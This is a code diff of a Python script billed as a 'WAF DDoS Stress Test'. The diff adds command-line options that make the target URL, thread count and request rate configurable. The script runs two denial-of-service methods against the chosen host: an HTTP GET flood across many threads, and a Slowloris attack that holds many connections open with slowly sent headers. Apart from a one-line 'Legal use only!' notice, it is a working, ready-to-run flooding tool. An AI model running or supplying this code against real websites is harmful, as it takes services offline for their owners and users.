@@ -1,3 +1,11 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+WAF DDoS Stress Test
+HTTP Flood + Slowloris
+Legal use only!
+"""
+
 import socket
 import threading
 import random
@@ -6,28 +14,38 @@ import urllib.parse
 import logging
 import os
 import ssl
+import argparse
 from datetime import datetime
 from contextlib import suppress
 
-# Konfiguration
-TARGET_URL = "http://example.com"
-THREAD_COUNT = 100
-REQUESTS_PER_THREAD = 100
+# -------------------------
+# CLI ARGUMENTS
+# -------------------------
+parser = argparse.ArgumentParser(description="WAF DDoS Stress Test Tool")
+parser.add_argument("--target", required=True, help="Target URL (e.g., https://example.com)")
+parser.add_argument("--threads", type=int, default=100, help="Number of threads")
+parser.add_argument("--rpt", type=int, default=100, help="Requests per thread")
+parser.add_argument("--logdir", default="./logs", help="Log directory")
+parser.add_argument("--insecure-tls", action="store_true", help="Disable TLS certificate verification")
+args = parser.parse_args()
 
-# Logging
-LOG_DIR = os.environ.get("WAF_STRESS_LOG_DIR", "/var/logs")
+TARGET_URL = args.target
+THREAD_COUNT = args.threads
+REQUESTS_PER_THREAD = args.rpt
+LOG_DIR = args.logdir
+INSECURE_TLS = args.insecure_tls
+
 LOG_BASENAME = "waf_stress_test"
 
-# TLS-Validierung: Default aus (für Tests ohne gültiges Zertifikat).
-INSECURE_TLS = os.environ.get("WAF_STRESS_INSECURE_TLS", "1") == "1"
-
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
 ]
 
-# Richtet die Logausgabe in Datei und Konsole ein.
+# -------------------------
+# LOGGING SETUP
+# -------------------------
 def _setup_logging():
     os.makedirs(LOG_DIR, exist_ok=True)
     timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
@@ -51,7 +69,9 @@ def _setup_logging():
 
 LOGGER = _setup_logging()
 
-# Zerlegt die Ziel-URL in Host, Port, Pfad und Schema.
+# -------------------------
+# URL PARSER
+# -------------------------
 def parse_url(url: str):
     parsed = urllib.parse.urlparse(url)
     host = parsed.hostname
@@ -60,7 +80,9 @@ def parse_url(url: str):
     path = parsed.path if parsed.path else "/"
     return host, port, path, scheme
 
-# Baut die TCP- oder TLS-Verbindung zum Ziel auf (mit SNI bei HTTPS).
+# -------------------------
+# CONNECTION HANDLER
+# -------------------------
 def _connect(host: str, port: int, scheme: str) -> socket.socket:
     raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     raw.settimeout(4)
@@ -75,7 +97,9 @@ def _connect(host: str, port: int, scheme: str) -> socket.socket:
         return ctx.wrap_socket(raw, server_hostname=host)
     return raw
 
-# Liest nur die erste Zeile der HTTP-Antwort, um den Status zu sehen.
+# -------------------------
+# RECEIVE STATUS LINE
+# -------------------------
 def _recv_status_line(sock: socket.socket) -> str:
     with suppress(Exception):
         sock.settimeout(2)
@@ -89,7 +113,9 @@ def _recv_status_line(sock: socket.socket) -> str:
         return line.decode(errors="replace")
     return ""
 
-# Sendet viele einfache GET-Anfragen in kurzer Zeit.
+# -------------------------
+# ATTACK METHODS
+# -------------------------
 def http_flood():
     host, port, path, scheme = parse_url(TARGET_URL)
     for i in range(REQUESTS_PER_THREAD):
@@ -101,7 +127,6 @@ def http_flood():
                 f"GET {path} HTTP/1.1\r\n"
                 f"Host: {host}\r\n"
                 f"User-Agent: {ua}\r\n"
-                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                 f"Connection: close\r\n\r\n"
             ).encode()
             with suppress(OSError):
@@ -120,7 +145,6 @@ def http_flood():
                 with suppress(OSError):
                     s.close()
 
-# Hält viele Verbindungen mit langsam gesendeten Headern offen.
 def slowloris():
     host, port, path, scheme = parse_url(TARGET_URL)
     sockets = []
@@ -156,7 +180,9 @@ def slowloris():
             s.close()
         LOGGER.info(f"slowloris closed idx={idx}")
 
-# Startet die Threads und wartet auf den Abschluss.
+# -------------------------
+# MAIN
+# -------------------------
 def main():
     LOGGER.info(f"start target={TARGET_URL} threads={THREAD_COUNT} per_thread={REQUESTS_PER_THREAD}")
 
